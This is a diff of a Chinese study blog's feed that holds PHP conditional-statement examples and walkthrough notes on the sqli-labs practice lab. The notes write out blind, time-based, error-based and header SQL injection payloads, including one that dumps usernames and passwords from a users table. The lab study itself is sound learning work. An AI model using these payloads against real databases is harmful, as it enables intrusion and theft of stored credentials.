+    <url>/2020/10/24/php%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<h2 id="PHP条件语句"><a href="#PHP条件语句" class="headerlink" title="PHP条件语句"></a>PHP条件语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a nice day!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<h3 id="if…else-语句"><a href="#if…else-语句" class="headerlink" title="if…else 语句"></a>if…else 语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good day!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good night!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<h3 id="if…elseif…else-语句"><a href="#if…elseif…else-语句" class="headerlink" title="if…elseif…else 语句"></a>if…elseif…else 语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>$t=date(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> ($t&lt;<span class="hljs-string">&quot;10&quot;</span>)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good morning!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> ($t&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good day!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good night!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<h2 id="PHP-Switch语句"><a href="#PHP-Switch语句" class="headerlink" title="PHP Switch语句"></a>PHP Switch语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$favcolor=<span class="hljs-string">&quot;red&quot;</span>;<br><span class="hljs-keyword">switch</span> ($favcolor)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;red&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是红色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;blue&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是蓝色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;green&quot;</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是绿色！&quot;</span>;<br>	<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色不是这三个！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br>  <span class="hljs-comment">#输出结果：</span><br><span class="hljs-comment">#你喜欢的颜色是红色！ </span><br><br><br><br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs less5-6盲注</title>
+    <url>/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<p>这两关中不再有数据回显到前端页面，需要利用一些方法、判断进行尝试。</p>
+<h1 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h1><p>•基于布尔 SQL 盲注 </p>
+<p>•基于时间的 SQL 盲注 </p>
+<p>•基于报错的 SQL 盲注</p>
+<h2 id="基于布尔-SQL-盲注"><a href="#基于布尔-SQL-盲注" class="headerlink" title="基于布尔 SQL 盲注"></a>基于布尔 SQL 盲注</h2><h3 id="截取字符串相关函数"><a href="#截取字符串相关函数" class="headerlink" title="截取字符串相关函数"></a>截取字符串相关函数</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201124161121482.png"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">▲ascii(substr((<span class="hljs-keyword">select</span> table_name information_schema.tables <span class="hljs-keyword">where</span> tables_schema =<span class="hljs-keyword">database</span>()<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span> <span class="hljs-comment">--+ //substr()函数，ascii()函数 </span><br><span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">substr</span>(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。<span class="hljs-keyword">Ascii</span>()将某个字符转换 为 <span class="hljs-keyword">ascii</span> 值 ▲<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((selectdatabase()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">98</span> <br>▲<span class="hljs-keyword">ORD</span>(<span class="hljs-keyword">MID</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(<span class="hljs-keyword">CAST</span>(username <span class="hljs-keyword">AS</span> <span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x20</span>)<span class="hljs-keyword">FROM</span> security.users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">98</span>%<span class="hljs-number">23</span> <br>//<span class="hljs-keyword">ORD</span>()函数，<span class="hljs-keyword">MID</span>()函数 <span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">mid</span>(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 <span class="hljs-keyword">Ord</span>()函数同 <span class="hljs-keyword">ascii</span>()，将字符转为 <span class="hljs-keyword">ascii</span> 值<br><br></code></pre></td></tr></table></figure>
+
+<p>ord()→mid()</p>
+<p>ascii()→substr()                            这二者通常组合使用</p>
+<h3 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h3><p>这边拿user()来举个栗子，这边结果为root</p>
+<p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201130193453164.png"></p>
+<p>这边使用了if语句</p>
+<p>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 </p>
+<p>于 0 或者 1 进行判断。</p>
+<p>但是这里可以通过是否有回显进行判断结果的正确性。</p>
+<h4 id="通过regexp正则注入查表名"><a href="#通过regexp正则注入查表名" class="headerlink" title="通过regexp正则注入查表名"></a>通过regexp正则注入查表名</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201124204427880.png"></p>
+<h2 id="基于时间sql注入——延时注入"><a href="#基于时间sql注入——延时注入" class="headerlink" title="基于时间sql注入——延时注入"></a>基于时间sql注入——延时注入</h2><p>可与前面的截取字符串函数，逻辑判断联用</p>
+<p>举个栗子</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.199.132</span>/sqli-labs/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>&#x27; and if(left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
+
+<p>在网速不好的情况下，该方法注入会受其影响。</p>
+<h2 id="基于报错sql注入"><a href="#基于报错sql注入" class="headerlink" title="基于报错sql注入"></a>基于报错sql注入</h2><p>相比一个个手打或者等时长来说，报错sql注入确实方便很多。</p>
+<h3 id="▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a"><a href="#▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a" class="headerlink" title="▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a"></a>▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201125220841958.png"></p>
+<p>[]: <a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a>    “Mysql报错注入之floor(rand(0)*2)报错原理探究”</p>
+<h3 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h3><h4 id="Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）"><a href="#Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）" class="headerlink" title="Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）"></a>Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a)) <br></code></pre></td></tr></table></figure>
+
+<h4 id="bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）"><a href="#bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）" class="headerlink" title="bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）"></a>bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> !(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) -（ps:这是减号） ~<span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>
+
+<p>好家伙，我这里mysql版本为5.5.53,并不能成功实现报错。</p>
+<h3 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a>xpath 函数报错注入</h3><h4 id="extravalue-报错注入"><a href="#extravalue-报错注入" class="headerlink" title="extravalue()报错注入"></a>extravalue()报错注入</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127195301610.png"></p>
+<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127195328445.png"></p>
+<p>这里的0x7e可换为其他的十六进制符号编码，若为十六进制字母编码或者非十六进制编码则报错失败</p>
+<h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127204011874.png"></p>
+<p>据说这个只能查系统版本，改天来试一下好了。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理了一下这两关注入所需的方法，今天好像是写这篇博客的的的的的的的的的。。。。。。。。对，第六天（27了，就离谱），讲真内容还蛮多的，慢慢来好了，反正我不急，我真的不着急。</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs 1-4 小结</title>
     <url>/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/</url>
     <content><![CDATA[<h2 id="分析sql查询语句"><a href="#分析sql查询语句" class="headerlink" title="分析sql查询语句"></a>分析sql查询语句</h2><p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120164820214.png"></p>
@@ -1078,23 +1129,6 @@
 <p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120165026263.png"></p>
 <p>知道数据列数再进行爆破</p>
 <p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120165508147.png"></p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs-less-1</title>
-    <url>/2020/11/09/sqli-labs-less-1/</url>
-    <content><![CDATA[<h2 id="通过union-select寻找显示位"><a href="#通过union-select寻找显示位" class="headerlink" title="通过union select寻找显示位"></a>通过union select寻找显示位</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109205829466.png"><span class="image-caption">image-20201109205829466</span></p>
-<p>由图可知，2、3位是显示位</p>
-<p>当id的数据在数据库中不存在时，前一个选择语句为空，后一个语句的内容显示出来构造union的数据 </p>
-<p><img src="/2020/11/09/sqli-labs-less-1/image-20201109193423719.png"><span class="image-caption">image-20201109193423719</span></p>
-<p>与前者不同的是这里输入的的语句为?id=1’ and 1=2 但该语句显然为假 与id=-1‘的使用性质相同</p>
-<h2 id="查询版本及数据库名称"><a href="#查询版本及数据库名称" class="headerlink" title="查询版本及数据库名称"></a>查询版本及数据库名称</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109202804217.png"><span class="image-caption">image-20201109202804217</span></p>
-<p>这里必须两个两个查询</p>
-<h2 id="查询数据库用户名、数据库路径"><a href="#查询数据库用户名、数据库路径" class="headerlink" title="查询数据库用户名、数据库路径"></a>查询数据库用户名、数据库路径</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109203608696.png"><span class="image-caption">image-20201109203608696</span></p>
-<p>同上</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1138,43 +1172,17 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs less5-6盲注</title>
-    <url>/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<p>这两关中不再有数据回显到前端页面，需要利用一些方法、判断进行尝试。</p>
-<h1 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h1><p>•基于布尔 SQL 盲注 </p>
-<p>•基于时间的 SQL 盲注 </p>
-<p>•基于报错的 SQL 盲注</p>
-<h2 id="基于布尔-SQL-盲注"><a href="#基于布尔-SQL-盲注" class="headerlink" title="基于布尔 SQL 盲注"></a>基于布尔 SQL 盲注</h2><h3 id="截取字符串相关函数"><a href="#截取字符串相关函数" class="headerlink" title="截取字符串相关函数"></a>截取字符串相关函数</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201124161121482.png"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">▲ascii(substr((<span class="hljs-keyword">select</span> table_name information_schema.tables <span class="hljs-keyword">where</span> tables_schema =<span class="hljs-keyword">database</span>()<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span> <span class="hljs-comment">--+ //substr()函数，ascii()函数 </span><br><span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">substr</span>(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。<span class="hljs-keyword">Ascii</span>()将某个字符转换 为 <span class="hljs-keyword">ascii</span> 值 ▲<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((selectdatabase()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">98</span> <br>▲<span class="hljs-keyword">ORD</span>(<span class="hljs-keyword">MID</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(<span class="hljs-keyword">CAST</span>(username <span class="hljs-keyword">AS</span> <span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x20</span>)<span class="hljs-keyword">FROM</span> security.users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">98</span>%<span class="hljs-number">23</span> <br>//<span class="hljs-keyword">ORD</span>()函数，<span class="hljs-keyword">MID</span>()函数 <span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">mid</span>(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 <span class="hljs-keyword">Ord</span>()函数同 <span class="hljs-keyword">ascii</span>()，将字符转为 <span class="hljs-keyword">ascii</span> 值<br><br></code></pre></td></tr></table></figure>
-
-<p>ord()→mid()</p>
-<p>ascii()→substr()                            这二者通常组合使用</p>
-<h3 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h3><p>这边拿user()来举个栗子，这边结果为root</p>
-<p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201130193453164.png"></p>
-<p>这边使用了if语句</p>
-<p>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 </p>
-<p>于 0 或者 1 进行判断。</p>
-<p>但是这里可以通过是否有回显进行判断结果的正确性。</p>
-<h4 id="通过regexp正则注入查表名"><a href="#通过regexp正则注入查表名" class="headerlink" title="通过regexp正则注入查表名"></a>通过regexp正则注入查表名</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201124204427880.png"></p>
-<h2 id="基于时间sql注入——延时注入"><a href="#基于时间sql注入——延时注入" class="headerlink" title="基于时间sql注入——延时注入"></a>基于时间sql注入——延时注入</h2><p>可与前面的截取字符串函数，逻辑判断联用</p>
-<p>举个栗子</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.199.132</span>/sqli-labs/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>&#x27; and if(left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
-
-<p>在网速不好的情况下，该方法注入会受其影响。</p>
-<h2 id="基于报错sql注入"><a href="#基于报错sql注入" class="headerlink" title="基于报错sql注入"></a>基于报错sql注入</h2><p>相比一个个手打或者等时长来说，报错sql注入确实方便很多。</p>
-<h3 id="▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a"><a href="#▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a" class="headerlink" title="▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a"></a>▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201125220841958.png"></p>
-<p>[]: <a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a>    “Mysql报错注入之floor(rand(0)*2)报错原理探究”</p>
-<h3 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h3><h4 id="Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）"><a href="#Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）" class="headerlink" title="Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）"></a>Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a)) <br></code></pre></td></tr></table></figure>
-
-<h4 id="bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）"><a href="#bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）" class="headerlink" title="bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）"></a>bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> !(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) -（ps:这是减号） ~<span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>
-
-<p>好家伙，我这里mysql版本为5.5.53,并不能成功实现报错。</p>
-<h3 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a>xpath 函数报错注入</h3><h4 id="extravalue-报错注入"><a href="#extravalue-报错注入" class="headerlink" title="extravalue()报错注入"></a>extravalue()报错注入</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127195301610.png"></p>
-<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127195328445.png"></p>
-<p>这里的0x7e可换为其他的十六进制符号编码，若为十六进制字母编码或者非十六进制编码则报错失败</p>
-<h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h3><p><img src="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/image-20201127204011874.png"></p>
-<p>据说这个只能查系统版本，改天来试一下好了。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理了一下这两关注入所需的方法，今天好像是写这篇博客的的的的的的的的的。。。。。。。。对，第六天（27了，就离谱），讲真内容还蛮多的，慢慢来好了，反正我不急，我真的不着急。</p>
+    <title>sqli-labs-less-1</title>
+    <url>/2020/11/09/sqli-labs-less-1/</url>
+    <content><![CDATA[<h2 id="通过union-select寻找显示位"><a href="#通过union-select寻找显示位" class="headerlink" title="通过union select寻找显示位"></a>通过union select寻找显示位</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109205829466.png"><span class="image-caption">image-20201109205829466</span></p>
+<p>由图可知，2、3位是显示位</p>
+<p>当id的数据在数据库中不存在时，前一个选择语句为空，后一个语句的内容显示出来构造union的数据 </p>
+<p><img src="/2020/11/09/sqli-labs-less-1/image-20201109193423719.png"><span class="image-caption">image-20201109193423719</span></p>
+<p>与前者不同的是这里输入的的语句为?id=1’ and 1=2 但该语句显然为假 与id=-1‘的使用性质相同</p>
+<h2 id="查询版本及数据库名称"><a href="#查询版本及数据库名称" class="headerlink" title="查询版本及数据库名称"></a>查询版本及数据库名称</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109202804217.png"><span class="image-caption">image-20201109202804217</span></p>
+<p>这里必须两个两个查询</p>
+<h2 id="查询数据库用户名、数据库路径"><a href="#查询数据库用户名、数据库路径" class="headerlink" title="查询数据库用户名、数据库路径"></a>查询数据库用户名、数据库路径</h2><p><img src="/2020/11/09/sqli-labs-less-1/image-20201109203608696.png"><span class="image-caption">image-20201109203608696</span></p>
+<p>同上</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1316,6 +1324,80 @@
 <p>less15 为’，less16为“）</p>
 <p><img src="/2021/01/15/sqllib-11-16/image-20210123204010453.png"><span class="image-caption">image-20210123204010453</span></p>
 <p>正确的时候可以直接登录，不正确的时候延时 5 秒</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 18-22</title>
+    <url>/2021/01/24/sqllib-18-22/</url>
+    <content><![CDATA[<h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><img src="/2021/01/24/sqllib-18-22/image-20210124212923133.png"></p>
+<p>post界面，还显示ip地址？莫非……注入点在ip上？</p>
+<p>看看源码</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210124213220267.png"></p>
+<p>好家伙，username和password都被处理了，有点意思</p>
+<p>然后</p>
+<p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script  locations)等等信息的数组。这个数组中的项目由 Web  服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p>
+<p>注意: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 (注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同)</p>
+<p><strong>$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。<br> $_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。</strong></p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210124213330680.png"></p>
+<p>insert？ip_address? uagent?看起来应该有机会进行注入</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210124231915960.png"></p>
+<p>成功登陆如图所示</p>
+<p>那抓个包看看，</p>
+<p>？？？？？？？抓不出来，啊这，怎么会这样</p>
+<p>百度查了一下需要将127.0.0.1改成本机ipv4的dns，brupsuit不支持抓本地包</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125095923408.png"></p>
+<p>在proxy 中抓到的包发到repeater中，对user-agent进行‘注入，响应中出现报错</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125101641720.png"></p>
+<p>回显的话，就用报错注入吧</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125101946009.png"></p>
+<p>之后就是和前面一样的啦</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125110941683.png"></p>
+<p>然后网上有这种解法但是在我这里不仅不会出数据还不会报错，只能显示ip地址</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125111103481.png"></p>
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less 19"></a>less 19</h2><p><img src="/2021/01/24/sqllib-18-22/image-20210125140140766.png"></p>
+<p>referer 写面上了，那根据上一关，注入点应该在这里了</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125111654045.png"></p>
+<p>这边的submit的name可以不修改（改了也能用），这里没有用hackbar，不会报错</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125111847639.png"></p>
+<p>来个’试一试，报错了，那剩下的应该和less 18一样，</p>
+<p>打了n个报错语句之后，都不报错，再用‘试一下</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125113423830.png"></p>
+<p>绝了，算了，重新抓包吧，这就离谱</p>
+<p>好了可以了</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125113858188.png"></p>
+<p>尝试一些之前没打过的语句</p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125115352434.png"></p>
+<p><img src="/2021/01/24/sqllib-18-22/image-20210125115547501.png"></p>
+<p>这边因为没有限制的缘故，所以只显示了部分数据</p>
+<p>那真的就没机会一次性爆出所有数据？？？</p>
+<h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>然后你可能会发现都没有再用#了，</p>
+<p>#是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。</p>
+<p><strong>get请求的时候一般用:</strong></p>
+<p>1′ and 1=1 –+</p>
+<p>//这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。</p>
+<p>但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+</p>
+<p><strong>post请求的时候一般用：</strong></p>
+<p>这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+；</p>
+<p>而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。</p>
+<p>‘ and select count(*),concat(0x3a,0x3a,(select group_concat(username,password) from users where username not in (‘Dumb),0x3a，0x3a,floor(rand(0)*2))x from users group by x and ‘1’=’1</p>
